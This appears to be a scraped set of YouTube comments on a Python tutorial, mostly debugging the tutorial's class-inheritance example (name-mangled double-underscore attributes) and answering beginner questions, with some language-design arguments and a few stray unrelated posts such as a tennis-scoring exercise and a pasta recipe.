text:
Great video, just a small annotation at 39:30. Your Code is not working in python > 3.6

instead of 
   def toString(self):
        return "{} is {} cm tall and {} kilograms and say {}".format(
        self.__name,
        self.__height,
        self.__weight,
        self.__sound,
        self.__owner)

use this:
  def toString(self):
        return "{} is {} cm tall and {} kilograms and say {} and the owner is {}".format(
        self.get_name(),
        self.get_height(),
        self.get_weight(),
        self.get_sound(),
        self.get_owner())Ôªø

text: In Python if a class variable or method starts with double-score (__) is interpreted as private, so it isn't available in subclasses derived from the parent class. text: The fundamental problem is that this tutorial teaches a lot of incorrect things. This is teaching you "Java in Python", not Python. There are no private/public/protected variables in Python. Indeed, there is no concept of  *access modifiers at all*.Ôªø
author: Juan Arrivillaga

text: OMG, please could you expand on that? So why the getter/setter functions? What are they for? I'm completely new to Python but have to learn it very fast... ThxÔªø
author: Vpprof„Éï„Éó„É≠„Éï

text:
Hey Vpprof, below is a good explanation of what I was referring to. All I did was remove the underscores to the variables to make them easier to get to instead of the weakly private behavior modifications Python assigns with a single or double-underscored variable.

As others have said it's not actually "private" but as far as I can tell that's the closest you can get to the concept of private from other languages in Python. As far as the getter and setter functions are concerned, I want to say its a way for the developer to control the means by which one changes and accesses the value of these double-underscore, pseudo-private variables. 

https://www.youtube.com/watch?v=ALZmCy2u0jQÔªø
author: Steven B.

text:
As I can gather, Python does not technically have access modifiers but you can add a type of scope by convention and refer base classes. I struggled with this example as well but realised that the double underscore refers to private and are unable to refer by subclass. If you add a single underscore it emulates a scope of protected and will be able to access the base class properties. 

So my properties are defined as:
   _name = ""
   _height = 0
   _weight = 0
   _sound = ""

and the dog class method for toString:
def toString(self):
      return "Name: {}, height is {}, weight is {} and the sound is {} and the owner is {}".format(self._name, self._height, self._weight, self._sound, self.__owner) <-- double underscore on owner in the Dog class, so would not be able to inherit the value for further child classes, so I am saying that dog can only inherit from Animal and not filter down.

this worked perfectly. 

As with the comment that Derek's video is teaching you all wrong because Python does not have access modifiers, which is technically true, Derek is a Jack of all trades educator and from my personal experience of more strictly typed languages for me C#, python gives you access modifiers by convention in the case you come from one of these languages to make the transition easier and by design Python seems to more or less emulate OOP fairly accurately. So to say Derek is showing you Java python, is in my opinion not necessarily true. If that was the case Python would not allow you to create classes and add the ability of inheritance and polymorphism. OOP design is oop design regardless of language. The reason I believe that python might be a bit tricky with these methodologies is because it is such a syntactically free language and is extremely adaptable.Ôªø

text:
I was coding the same code while watching the video. Everything was OK but when we started the inheritance step my code bugged. I didn't understand why, if we can use "self" to call methods and atributes of its super-classe, isn't it?

Whiskers is 33 cm tall and 10 kilograms and say meow.
Traceback (most recent call last):
  File "Classes.py", line 95, in <module>
    print(spot.toString())
  File "Classes.py", line 78, in toString
    return "{} {} {} {} {}".format(self.__name, self.__height, self.__weight, self.__sound, self.__owner)
AttributeError: 'Dog' object has no attribute '_Dog__name'

What I understand is that the class didn't look for its super-class. Looking for in the internet, I found a solution, using the superclass method and just append the "owner" portion:

return super(Dog, self).toString() + "His owner is {}".format(self.__owner)

If someone else could explain why cound'nt I rewrite the function and continued using "self" I will be grateful.

Source
Stack Overflow - https://stackoverflow.com/questions/33131260/python-inheritance-returns-attribute-errorÔªø
author: Cleber Augusto

text:
I find an answering. If use code in the Dog Class constructor the same code you wrote before in the Animal Class:

self.__name = name
self.__height = height
self.__weight = weight
self.__sound = sound

You can solve this.

Source:
Stack Overflow -https://stackoverflow.com/questions/47607653/attributeerror-dog-object-has-no-attribute-dog-attrnameÔªø
author: Cleber Augusto

text:
"Attributes whose names start with double underscores are special and are not supposed to be accessed from anywhere except the class in which they are defined. So, you shouldn't try to access self.__name from Dog."

Source
Reddit - https://www.reddit.com/r/learnpython/comments/3fjo4s/problem_with_inheritance_attribute_error/Ôªø

text:
I need help with python i tried adding two variables that I assigned integers to but they don‚Äôt add up. For example, >>>var1= ‚Äú23‚Äù 
>>>Var2= ‚Äú5‚Äù 
>>>var3= var1 + var2 
>>>Var3 
‚Äú235‚Äù  
But when i put in 23+5 i get 28 How do i fix this?Ôªø
author: It'sYaBoiMason

text:
var1 = "23" & var2 = "5" aren't integers, but strings; why? Because you added quotation marks. 
var1 = 23   # integer because no quotations 
var2 = 5     # integer because no quotations
print( var1 + var2 )   # 28

In Python, strings are added, or concatenated, with other strings. 
var1 = "100"
var2 = "23"
print( var1 + var2 )   # string "10023" instead of integer 123 

Rule: strings and integers/floats can't be concatenated; 
var1 = "100"
var2 = 23
print( var1 + var2 )   # error 
---You must convert var2 integer value into a string type: 
print( var1 + str(var2) )   # str() converts integer 23 into string "23" 
OUTPUT: "10023"   # string type 

var1 = "100"
var2 = 23
print( var1 + var2 )   # you want to get integer 123, but error displays instead 
print( int(var1) + var2 )   # int() converts string "100" into integer 100 
OUTPUT: 123   # integer typeÔªø

text:
Actual overloaded method get_sound whereas multiple_sounds is simply a new method (no overloading):

    def get_sound(self, how_many=None):
        sound = None

        if how_many is None:
            sound = super(Dog, self).get_sound()
        else:
            sound = (super(Dog, self).get_sound() + " ") * how_many

        return sound

spot = Dog("Spot", 53, 27, "Ruff", "Derek")

print(spot.get_sound())

print(spot.get_sound(5))

Result:
Ruff
Ruff Ruff Ruff Ruff RuffÔªø

author: Ghandy kozman

text: In the first line you mentioned, he created an instance of the AnimalTesting object. Remember that AnimalTesting was just a blueprint and test_animals is one of the objects he has made while following the AnimalTesting blueprint. author: Derek Banas

text:
If you're new to programming you should probably take interactive courses that explain things from the beginning (what variables are and such) on for example codecademy. Understanding what is happening under the hood is very important to debugging and you won't remember much unless you get your hands dirty.

This tutorial is meant for people who probably already know a couple of programming languages and are just looking for a quick overview of syntax and common operations before beginning to use it for their own purposes.

You should first consider if you need to learn python at all. Here are some applications to python: https://www.python.org/about/apps/Ôªø

author: Siva Kumar

text: Python tends to not include unnecessary shortcuts, in order to keep things as readable and comprehensive as possible. "&&" is faster to type, but "and" is comprehensive. "++" is faster to type, but it doesn't help readability and there's already "+=". Same reason why there is no "do while" in python.Ôªø

Amazing video, thank you so much! I have a couple of questions:

20:18 Why does end="" mean it wont jump to a new line for every printed value? What if I want all the values displayed in two lines?

21:54 - On line 23 why can't we just print(y) instead of print(num_list[x][y])?

23:08 - Why do you need to repeat the random_num variable on line 9 when it's already on line 5?

24:54 - Why do we write i +=1 again on line 22?

26:55 - How does stdin.readline() know to take 'Derek' as input?Ôªø
author: Nicole Kho

text:
Thank you :) end defines what value appears after the line is printed. It is a newline by default.
To print each value in the list one at a time I have to supply both x, for the list in the list and each value in that interior list.
I'm changing the random number guessed each time in the while loop. Oterwise it would keep the same number and create an infinite loop.
Without the i += 1 before the continue statement i would never increment because continue would stop execution before getting to the last i += 1
readline waits for input and then ends input when the enter key is pressedÔªø

text: Can someone ELI5 classes constructors and objects? This is legit going over my head >.<Ôªø
author: Yanli Wang

text:
1. Every real world object has 2 things that define it. I'll use a dog as an example.
2. The dog has attributes like height, weight, name, etc. These are called fields in a class.
3. The dog has capabilities like running, eating, biting, etc. These are called methods in a class.
4. A class defines these attributes and capabilities to model a real world dog.
5. When you create a new dog you call the constructor function each time one is made. When it is called you assign values to fields like the dogs, name, height and weight. A constructor sets up or initializes each new dog created.


Does that help?Ôªø

author: Jerry Perry

text:
Yes ok true, i'll give you that one. I'm a new line guy. xD
I personally find it to be clearer with parentheses because there is an obvious end of a block. The start of a method is not that important to me because every method starts with a returntype/void or decleration as public or private anyway. Statement's are very clear to see as well.
I think another big problem i have with the language is the lack of the semicolon's at the end of a line. If you a.e. have code you want to collapse into a single line and this one line gets so long that it doesn't fit on the monitor anymore, in c# you can spread this single line over multiple lines and still have a obvious end with the semicolon. Idk how this works out in Python after a while, i have a hard time believing it won't get a bit messy. I think it's easyer to read but it comes down to personal preference at the end, i guess.
Further, i like clearly declared variables. Performance is another thing. Never testet it myself but I heard it a lot that Python is a bit slow.Ôªø
author: Matthias Gut

text:
There are a lot of problems with Python as you've pointed out.

semi-colons;
Sure, you don't have to have semi-colons at the end of a line of code like C/C++/C#/Java... But for me, it makes it much faster to read code and less cognitive effort to find the end of one line of code that spans multiple lines.  For Python, you have to have a concatenation operator in order to break one line into multiple lines.  If i remember correctly, their multi-line concatenation operator is the double-backslash.

braces { } for code blocks
Same deal here too:  Easier to read and less cognitive effort.  I swear all these trendy hipsters who like Python... it fucking seems like they NEVER have to go back and READ CODE.  Eh, I take that back... I remember programming in QBasic... your brain will eventually adjust... it just seems like it'd be much slower to read without the the braces & semi-colons JUMPING OUT AT YOU.  And by slower, yes, I'm sure we're talking about a difference of milliseconds... but still, seems significant to me (when you add it up. lol).

maps & lists
First, Python is very inconsistent between maps & lists.  For maps, you use a keyword to act on the object in order to delete an entry.  For lists, you use a method of the object to remove an entry.  Why the inconsistency ?

self
While we're on the subject of methods... That reminds me:  Why the need for self EVERYWHERE ?  Why do you have to put self in every method declaration ?  I mean, to put this question in perspective, remember that on a language scale from concise-to-verbose, it seems like in every decision that Python has made... it has made the choice TO BE MORE CONCISE... except when it comes to method declarations ?

I mean sure, under the hood, this is just how it works: It's an implementation detail... and one that most other object-oriented languages don't worry the programmer with.

maps & lists
Back to maps & lists...  Using symbols to create these new objects is a nice convenience for experts, but I believe it's doing a disservice to beginners who are learning object-oriented programming.  One of the best ways to learn object-oriented programming is by using well designed objects over & over again... until it "clicks" for you... and you "get it."  And some of the best designed objects we have in C++/C#/Java are the Collection classes.  A beginner can easily use these Collection classes... and start to understand how to design their own classes.

type system
Furthermore, the problem with Python maps & lists is that there is no separation between interface & implementation.  So, that's a huge problem.  First, students aren't learning polymorphism.  That, for example, they have ask for a List in a functions, method, or constructor... then pass in any implementation later (Vector, ArrayList, LinkedList).

But that's a huge problem because in Python, there are no types in your functions, methods, & constructors.  So what is preventing you from passing in ANY OBJECT that happens to crash the whole system and your business loses money and/or clients/customers because of it.

I don't think a lot of Python programmers understand the power of a compiler:  To be able to catch errors at compile-time is a beautiful thing.  For a static-type system, wiring objects together is like playing with legos ... because the compiler enforces which legos can fit together, and which legos cannot... Or, in this case, objects.

csv
I also spotted some inconsistencies where arguments are sometimes separated by a space and other times, they are separated by a comma.  THIS IS BONKERS.  Most languages have stated goals to read like prose (as much as possible).  And in prose, we separate items with commas, NOT spaces.

language design
For language designers, they have to strike a delicate balance between being concise(& faster to type) and being verbose(& faster to read).  Me personally, having to read other people's code, I prefer verbosity.  Even with Java being pretty verbose, I frequently find bugs where the intention of the code is unclear.  Did the programmer want THIS behavior ?  Or THAT behavior ?  ...probably something that can only be answered by the original programmer (if available) or the program specification (if available).  I can only imagine how much worse this would be in Python.

Even tho it seems like I've written a lot here, I could actually go on & on forever about Python & real-life arguments I've had with Python programmers... wanting to dump anything into a collection... that should be organized for retrievals... and telling me SPI META-INF/services/ was impossible ! HA !  But that's a story for another time.Ôªø
author: Nikolai Kalashnikov

text: Nikolai I don't know what a map is in python. Could you explain that a little bit? To delete an entry in a list you simply use del mylist[x]. Objects can be deleted the same way but are deleted when you have no reference to them. No garbage collection to worry about. Don't know in which languages you have to deal with that but it's a pain. Python is simple. Which makes it great when you want to dive into the programming without having to worry about technical details. You can quickly build a prototype. When you have something working it's easy to translate into other languages. Python is excellent for beginners. Takes five minutes to get going.Ôªø
author: Jerry Perry

text:
Quote: Python is excellent for beginners.
Uh no, did you read what I wrote ?  I explained very clearly WHY Python is horrible for beginners.

First, it uses symbols for some Collection objects, which while it's a nice convenience for experts, it inconsistent & wrong.  Wrong because in a good standard library like in C++/C#/Java, the standard library will give beginners a wide array of EXAMPLES of well designed objects.  By using these well designed classes & objects, it'll help them learn object-oriented programming.

Second, there's no view, no virtual, no interface, no abstract class... there's not even a type system.  So you cannot separate interface from implementation.  In such an environment, how can a beginner possible learn polymorphism ?

Pssh, let's not worry ourselves with technical details like good object-oriented programming & polymorphism.

To answer your other question, a Map is a Collection of key-value pairs.  Also known as a Dictionary.
11:30 del grocery_list[4]
vs
11:30 grocery_list.*remove*("Pickle")
14:21 del super_villians['Fiddler']

This is a glaring inconsistency where on one-hand, Python is using a keyword to act upon the internal state of an object... and on the other hand, Python is using a method to change the internal state of an object.

Did you read anything I wrote ?  Or where you just too quick to defend MAH favorite language in a thread designed to criticize it ?

Listen, criticism is good.  I criticize my favorite languages too, so don't get offended.  But the topic here is Python.  The OP pointed some things that I agreed with (braces & semi-colons).  I merely added to his list:  Namely, that Python is horrible for beginners.  Really, ANY dynamically typed language is horrible for beginners.  ANY statically typed language is much better for beginners because they will be given immediate feedback of errors from the compiler.  Plus, with the type system, they will be able to learn more advanced concept like polymorphism... And separation between interface & implementation, which doesn't even make sense in a Python-like environment.Ôªø
author: Nikolai Kalashnikov

text:
Nikolai Yes I read what you wrote. That doesn't mean I agree with it. Just because you typed something doesn't make you a god that can't be questioned. I understand that you meant dictionaries. Thought it would be a good idea for you to explain it yourself. Map is a common term but in Python it's dictionary. Guess you could also call it associative array if you want. You seem focused on object orientation. I see that as a subject of its own and not necessary for small projects. Object orientation can give you head ache when you start thinking about philosophical questions like what a shape is, what should inherit a shape and what has a shape. Learning to write good classes takes a long time. Instead of logic you will spend much time with loose coupling and patterns. Beginners should learn to write algorithms and understand logic. When they have the pieces they can stuff it into a class. Then we suddenly have objects that need to work together. Abtraction is moved to a higher level. Which means new challenges. But I guess we have different views on what programming is. To me it isn't even about computers but a way of thinking and solving problems.

Yes it's a good idea to have a strongly typed language. PHP doesn't have it. Not javascript or Python. Actionscript on the other hand, C#, C++ and Java are strongly typed. I've used all of them and never had any problem. Confusing at first but you get used to it. If I started using PHP again I would forget those annoying dollar signs.Ôªø
author: Jerry Perry

text:
Yes, I agree that OOP can get philosophical pretty quickly.  That's why I like to think in terms of lego blocks:  And simply ASK for what you need in the constructor & method signature.  I also like to ask the question:  "How can I make my objects intuitive & easy to use ?"

But as you've pointed out, OOP is not a solution for everything... despite what the OOP "experts" would have us believe.  I haven't personally hit the limitations of OOP... but I've read some articles.  Two examples stand out the most.

First example would be when Netflix refactored their codebase using their functional reactive model... they were seeing over 20 network calls per user operation... and with a functional model, they were able to make drastic improvements (i think one or two network calls if i remember correctly).

Second example would be some guy who wrote chess games... He explains how cringe-worthy this job interview question is:  "Model a chess game using OOP."  He explains the actual inter-workings of a computer chess game... How a Tree data structure is used to determine moves... and how OOP utterly FAILS in this situation because of the amount of memory that the objects would take up... Versus, how it's actually done... which I don't remember exactly... but it's basically low-level optimizations using bits to reduce the amount of memory that's used.

But yeah, I'm not God.  The closest thing to a God would be Misko Hevery.
Sometimes, I ask myself: "What would Misko do ?"Ôªø

text:
+Derek Banes You use a GUI (Graphical User Interface) framework like Kivy. 

A framework is a collection of code that you can import (bring into your python file). 

Using the Kivy framework, you can draw images, shapes, and more. Kivy specializes in app develop for multi-touch devices, like your smartphones and tablets. 

BEFORE using any framework, module, or library, make sure you learn the programming basics first. 

  - Variables
  - How important list, tuple and dictionary types are in, data management.
  - If statements
  - Loop statements
  - Functions
  - Classes
  - Inheritance
  - File I/O 

That should be a good start. Once you get the basics down, try Kivy out. It is very easy to use compared to other GUI frameworks.Ôªø

author: Derek Banas

text: Warning! This tutorial is not a good Python tutorial. It is clearly written by someone who comes from a Java/C++ background, and misuses Python constructs that they confuse for constructs from those languages. For example, it uses double-underscore name-mangling, i.e. things like  `self.__myvar = myvar` , but this is *not meant to be used like a private access modifier*. You just do `self.myvar = myvar` in Python, or, if you want to signal to people that an attribute is an implementation detail, you use a *single underscore*. Second, the tutorial creates a bunch of class variables, that are immediately shadowed by instance variables in the initializer. This is totally pointless, and can lead to subtle bugs. Finally, a `toString` method?  Use `__str__` in Python, and then you can just `print(instance)` or `str(instance)`. Again, clearly someone is coming from Java or C++.Ôªø

Classes are weird. They represent real world objects. For example if you want to model a real world Car you would say that the car has attributes like color, brand, its current speed, etc. A Car also has capabilities like opening doors, driving, stopping, etc. 


A class calls an objects attributes its fields. It calls a Cars capabilities methods, or functions.

text:
Great summary of python for a <45 min video. However, if I may point out some possible easier ways to do things:

17:45 - 17:56 = Rather than write "if ((age >= 1) and (age <= 18)):" , 
you could have just written "if 1 <= age <= 18:" . This is valid syntax in Python.

26:33 - 26:50 = You could have just written "name = input('What is your name')".
This would replace lines 5 & 7 (in python2, I think it's raw_input()).

30:44 - 31:10 = If u want to write to a file, you could just say:
"with open('example.txt', 'a') as f:
          print('Write me to the file', file=f)"
This will open the file, write to it (automatically including the newline) AND close it for you once you are done (Im not sure if this is only specific to Python3 though).Ôªø

text: There are different levels someone can be unique. Everyone is different, but some people's differences are more extreme. For example, one dog is a brown labrador, the other is a golden labrador, the other dog is a different breed altogether. From the perspective of someone who is that different (a neurodivergent person for example), the differences between most people don't seem that remarkable.Ôªø

author: Derek Banas

text:
What people need to understand is that, to be a good programmer in the long run, you shouldn't try to "learn programming languages" or "try to learn C++ cos its the bestest one cuz it does da video games". You need to learn to programming in general, to think like a programmer, to get a sense of what your mindset needs to be when facing programming problems. And to do this, you need to start out with a simple language that doesn't frustrate you with complex things like type declaration, memory allocation,etc. (witch you'll then have to then learn, obviously).
That's what python is for (partially), to have a simple language that you can use as a tool to get into the mindset of a programmer, to then advance to more complex languages like Java and C++, in witch all you'll have to do is use the same techinques you already learned, but with more language-bound complications that you'll have to get used to (witch is, believe it or not, the easier part).Ôªø

text:
During the For Loop section, he uses "for x" and "for y". What is the difference?

>>> for x in [2,4,6,8,10]:
 print(x, ' ', end="")
 
2  4  6  8  10  
>>> for x in [2,4,6,8,10]:
 print(y, ' ', end="")
 
2  2  2  2  2  
>>> for y in [2,4,6,8,10]:
 print(x, ' ', end="")

2  2  2  2  2  
>>> for y in [2,4,6,8,10]:
 print(y, ' ', end="")
 
2  4  6  8  10  

Why does it result in this way? Printing x vs. x or y vs. y will create a full list print, but one vs. the other will only print the first value of the list?Ôªø

author: MrFluffyTummy

text:
Here are some basic facts about tennis scoring:
A tennis match is made up of sets.  A set is made up of games.

To win a set, a player has to win 6 games with a difference of 2 games.  At 6-6, there is often a special tie-breaker.  In some cases, players go on playing till one of them wins the set with a difference of two games.

Tennis matches can be either 3 sets or 5 sets.  The player who wins a majority of sets wins the match (i.e., 2 out 3 sets or 3 out of 5 sets)
The score of a match lists out the games in each set, with the overall winner's score reported first for each set.  Thus, if the score is 6-3, 5-7, 7-6 it means that the first player won the first set by 6 games to 3, lost the second one 5 games to 7 and won the third one 7 games to 6 (and hence won the overall match as well by 2 sets to 1).

You will read input from the keyboard (standard input) containing the results of several tennis matches.  Each match's score is recorded on a separate line with the following format:

Winner:Loser:Set-1-score,...,Set-k-score, where 2 <= k <= 5

For example, an input line of the form

Williams:Muguruza:3-6,6-3,6-3

indicates that Williams beat Muguruza 3-6, 6-3, 6-3 in a best of 3 set match.

The input is terminated by a blank line.

You have to write a Python program that reads information about all the matches and compile the following statistics for each player:

Number of best-of-5 set matches won
Number of best-of-3 set matches won
Number of sets won
Number of games won
Number of sets lost
Number of games lost

You should print out to the screen (standard output) a summary in decreasing order of ranking, where the ranking is according to the criteria 1-6 in that order (compare item 1, if equal compare item 2, if equal compare item 3 etc, noting that for items 5 and 6 the comparison is reversed).

For instance, given the following data

Djokovic:Murray:2-6,6-7,7-6,6-3,6-1
Murray:Djokovic:6-3,4-6,6-4,6-3
Djokovic:Murray:6-0,7-6,6-7,6-3
Murray:Djokovic:6-4,6-4
Djokovic:Murray:2-6,6-2,6-0
Murray:Djokovic:6-3,4-6,6-3,6-4
Djokovic:Murray:7-6,4-6,7-6,2-6,6-2
Murray:Djokovic:7-5,7-5
Williams:Muguruza:3-6,6-3,6-3

your program should print out the following

Djokovic 3 1 13 142 16 143
Murray 2 2 16 143 13 142
Williams 0 1 2 15 1 12
Muguruza 0 0 1 12 2 15

You can assume that there are no spaces around the punctuation marks ":", "-" and ",".  Each player's name will be spelled consistently and no two players have the same name.

text:
I had the same issue and this is the solution. Derek copy-pasted the toString method from the Animal class, but he left the attributes as self.__name, self.__height etc. 
I don't really know how it worked for him but I have to call the Animal getter methods to get values for those variables. My guess is that even though we're inheriting from Animal class, we still can't access the private variables directly from the Dog class.

If you look at the cheat sheet in the video description, you'll see Derek also uses getter methods within the Dog toString method - for some reason he hasn't shown this in the video, but that's how to get around that problemÔªø

text:
Cauliflower & Broccoli Carbonara

Ingredients
kosher salt
1 lb. Macaroni
2 c. small broccoli florets
2 c. small cauliflower florets
2 large eggs, at room temperature
2 egg yolks, at room temperature
1/4 c. heavy cream, at room temperature
2 tbsp. extra-virgin olive oil
1 1/2 c. freshly grated Parmesan, plus more for garnish
Freshly ground black pepper
1/4 c. chopped fresh parsley, plus more for garnish
 
Directions
Bring an 8-quart stock pot of water to a boil and generously season with salt. Cook pasta according to package directions until al dente. During the last minute of cooking time, add broccoli and cauliflower. Reserve 1 cup pasta water.
Meanwhile, in a separate bowl combine eggs and yolks, heavy cream, olive oil, and Parmesan. Mix well with a fork and season with salt and pepper.
Drain pasta and vegetables; add back to pot. Stir in cheese mixture and parsley, then quickly toss together to evenly coat the pasta and prevent the eggs from scrambling. Add additional pasta water to make a creamy sauce.
Garnish with parsley and pepper. Serve immediately.Ôªø

text:
Sorry I didn't get to you quicker because I'm mobile. I tried to stick as close to your code as possible for this
import time

Add = 1
Remove = 2
Print = 3
End = 4
Choice = 0

To_do_List = []
print("WELCOME TO THE TO DO LIST\n")
print(To_do_List)
print("\n")

while Choice != "4":

    print("To add: 1\n")
    print("Remove: 2\n")
    print("View List: 3\n")
    print("Exit: 4\n")
    print("\n")

    Choice = input("Enter a number: \n")

    if str(Choice) == str(Add):
        Adding = input("Add item by name: \n")
        To_do_List.append(Adding)
        for Item in To_do_List:
            print(Item)
            time.sleep(2)
    elif str(Choice) == str(Remove):
        Delete = input("Remove item by name: \n")
        To_do_List.remove(Delete)
        for Item in To_do_List:
            print(Item)
            time.sleep(2)
    elif str(Choice) == str(Print):
        for Item in To_do_List:
            print(Item)
            time.sleep(2)
    else:
        print("")Ôªø

text:
Thank you for an excellent tutorial! I will definitely be sharing this with my friends :)

The only issue I have is the Classes - I don't think they were "pythonic". Python does not typically use private variables and/or getters / setters, one of the reasons being that they are not _really_ private and are actually accessible from outside the class. 

I think this is somewhat important, since otherwise beautiful Python can be really ugly when used the same way as Java/C++. 

Here is my sample of the same class:

class Animal:

    def _init_(self, name, height, weight):
        self.name = name
        self.height = height
        self.weight = weight
        self.sound = 0

    def _str_(self):
        return "{} is {} cm tall and {} kg and say {}".format(
            self.name,
            self.height,
            self.weight,
            self.sound
        )

cat = Animal(name='Whiskers', height=33, weight=10)
cat.sound = "Roar"
print(cat)

> Whiskers is 33 cm tall and 10 kg and say RoarÔªø

text:
Great video Derek. Right to the point.  I think Python may have changed a though and your use of inherited private variables no longer works. In fact I could not get the code you wrote towards the end with spot & the Dog class to work as you demonstrated.

Using double underscores in front of variables within classes to make them private does not work with inheritance.  Python cheats by name mangling and they end up with an actual name based on the parent class's name and not the child's. 

I think using a single underscore and relying on the convention is the right way to go here.Ôªø

text: Can someone explain why he needed to write "random_num = random.randrange(0, 100)" two times? I know that if you write just one it will generate only one number forever, but how does the second one make it do what its supposed to?Ôªø
author: Vojislav Belic

text: If he didn't change it in the loop each time, you would be stuck with the original random_num and get stuck in a loop. For example, the last numbers were 79, 45, then 15. The loop says, While random_num IS NOT EQUAL to 15, Since the number was 79, it created a new number 45, then tested again. It then created the last number that was 15 and stopped.Ôªø

text: print("5/2", 5/2) gave me 2. Why? Also, it gives me "end" is an unresolved reference!!Ôªø
author: Saed Daoud

text:
You're using integer division which truncates the decimal.  type this code. 
from _future_ import division
(two underscores)
then it should give you a decimal answer.Ôªø
author: Janett Autry

text:
"from future import division" from the previous comment imports Python 3 features in Python 2 where they've changed this behavior, but you don't necessarily need to do it. Just change "5/2" into "5.0/2"

5 is an integer value, 5.0 is a floating point one ( I suggest that you should learn basics of how numbers are coded in a computer if you haven't already). When you ask Python 2 to divide an integer by an integer he thinks that you ask for another integer and drops off the remainder. If you want a float than you should divide a float by a float (5.0 / 2.0). If you divide one type by another (5.0 / 2 or 5/2.0) then Python will transform both variables to one type that has the most precision of the two (in this case both values will become floats, i.e. 5.0 and 2.0).

truncating integer division is  rather common - C/C++ does that two (last time I checked). Expecting a floating point number from integer division is so common that modern languages start implementing int. Beside Python 3, for example, Haskell too gives 2.5 for 5/2. But I like older languages' behavior because it makes you think what happens under the hood. Modern languages try to make computer guess human logic, but there will always be surprises if you have no idea how numbers are handled. Try
> 1/3.0 == 1-2/3.0Ôªø
author: Vasya Bublikov

text: The problem was fixed when I used Python 3. I tried 5.0/2.0 on Python 2, but it didn't work. In C++ variables are defined prior to their use. So when you use "float x;", then x will be float even if the content is integer. In Python this isn't the case; there is no variables declarations. ThanksÔªø
author: Saed Daoud

text:
@Saed Daoud
That's strange 5.0 / 2.0 works on my computer in python 2.
When I was talking about C++ I meant rvalues, not lvalues. In C++
std::cout << 5/2 << '\t << 5.0 / 2 <<std::endl; works the same way as in Python 2. 5 is deduced as int and 5.0 as float. It's not a bug - it's logical behaviour.Ôªø

author: Toby Sawe

text: coming from a php background( dont hate me :'l  )  i noticed when you appended "onions" in grocery list the concatenated to_do_list was also updated? does that mean to_do_lists variable only has a reference to the grocery_list variable??? pls helpÔªø
author: Eldrin Paul Gok-ong

text:
Yes. Python doesn't duplicate data if it doesn't have to, so instead of a copy of the grocery_list being added to to_do_list, to_do_list points at grocery_list. If you wanted to copy all the data, you would slice grocery_list like this: to_do_list = [other_events, grocery_list[:]]
Other methods are:
to_do_list = [other_events, list(grocery_list)]
Or use the copy module and:
import copy
to_do_list = [other_events, copy.copy(grocery_list)]
If you need to copy objects, you can use
newObject = copy.deepcopy(oldObject)Ôªø

author: Daniel Martins

text:
Just spent an hour trying to figure out how Derek's code works. I ended up making it work by setting the attributes in the dog class:

class Dog(Animal):
    __owner = ""
    
    def __init__(self, name, height, weight, sound, owner):
        self.__owner = owner
        super(Dog, self).__init__(name, height, weight, sound)
        self.__name = name
        self.__height = height
        self.__weight = weight
        self.__sound = sound

Cool to see others had different methods.Ôªø
author: Oscar Alexander

text: @Oscar Alexander this method does not work properly as it makes new variables inside your dog class that have the same names as it's super class' variables. The getters and setters you inherit from Animal will not affect these new states of the dog class.Ôªø

author: Lyson Toughec

text:
Geez, no Do .. While or Do .. Until loops - the perfect solution for your rand_number example.

counter=0

Do
    counter++    #Python doesn't support this
    rnd=random.randrange(0,100)
    print(counter, rnd)
loop until rnd==15

Clear, efficient and easy to understand, very intuitive

Python's manual states that this is best practice:

while True:
            <setup code>
            if not <condition>:
                break
            <loop body>

So we need to go with:

counter=0

while True:
 
 counter += 1
 rnd=random.randrange(0,100)  
 print (counter, rnd)

 if (rnd==15):
  break

Terrible and contrived. I have to create an infinite loop and then explicitly break out of it because the language designers don't want to bloat their virtual machine or introduce superfluous constructs that will make the language harder to maintain for them. So the many have to suffer by bending to the will of the few for their convenience. Arrogance (Arrogance son of Arrothance) and laziness (Lazthorien) on behalf of Python maintainers (more aspirational high priests of computing). Let's rename the language, "Fiefdom"

Paraphrasing Gandalf: "Childless geeks sat in aged halls musing on virtual machines or in high, cold office blocks asking questions of Boolean Logic

And so the people of computing fell into ruin.
The line of kings failed {Richie, Thompson, Kernighan, Knuth, Wirth et all}. The knowledge tree withered.
The rule of code was given over to lesser men {van Rossum. Lerdorf, Thompson?!}"Ôªø
author: John von Horn

text:
Viva Las Vegas

#! /usr/bin/python

import random

counter=0
HighRoller=1000

while True:
 
 counter += 1
 rnd=random.randrange(0,HighRoller+1)
 print counter, rnd

 if (rnd==HighRoller):
  breakÔªø

If Python doesn't have enough features for you, use C++

Also if you don't like infinite loops or break statements:
counter = 0

while rnd != 15:
   counter += 1

author: David Morello

text:
Someone added your question to stackoverflow (http://stackoverflow.com/questions/41405959/object-not-inheretinting-functions-from-super-class).

For those still wondering, setting the names in the parent class (Animal) to __name sets them to private. Therefore, you need to change the name in the toString function in the Dog class to .format(self._Animal__name, etc)Ôªø

author: Small Coffee

text:
From my understanding of what you have told, all the text is in one list/dictonary

The write method takes one parameter, which is the string to be written. 

EXAMPLE:
mytext.write (" Your text ");

To start a new line after writing the data, add a 
 character to the end.

i.e. To start a new line after writing the data, add a <enter> character to the end.
EXAMPLE:

file = open("filename.txt", "w")

mytext.write("Your text                      <---- here <enter> character is used, hence ") goes to the next line
")
mytext.write("This text will be on next line")


a <enter> character needs to be added (equivalent to pressing the enter key)
Hence you need to add an <enter> character  after every few words, for the text to start from the next line.

use
 mytext.write ( dictionaryName['key'] )

after every few words (use a loop to count the words)
use

mytext.write ("
 ")

That is--      mytext.write (" <enter> ")       <---- an enter character within the quotesÔªø

author: Mindaugas Williams

text: You can do it if I can. The only skill you really need is the ability to break down a solution to a problem into a series of steps. After you break it down into steps you then will find it helpful to be able to repeat a series of steps until a condition is met. That is where looping comes in. Then you'll want to be able to perform different steps depending upon certain conditions. That is where if statements come in. You'll find that you are rewriting the same steps over and over and that is where functions come in. Eventually you'll want to model real world objects and that is where object oriented programming comes in. An object is just a description of the attributes and capabilities that a real world object or thing has. I'm working on a tutorial that should help explain all of this stuff very soon. I hope you give programming another try.Ôªø

text:
7:15 print("%s %s %s" %('quote', quote, multi )) This syntax is different than most languages where function & method arguments are comma separated. I wonder if the function declaration for print() is only accepting one parameter, then parsing it ? Because of the weird syntax with %() being passed in. Most languages would accept an array and the syntax would be print("%s %s %s", 'quote', quote, multi)... Yeah, looking at the source code, it looks like there can only be one comma that does separation of args & kwargs (keyword_args like sep, file & end as shown in 7:50). Based off the function declaration, i'm guessing that if you wanted to use all 3 keywords sep, file, & end, i'm guessing that they'd be separated by spaces ?

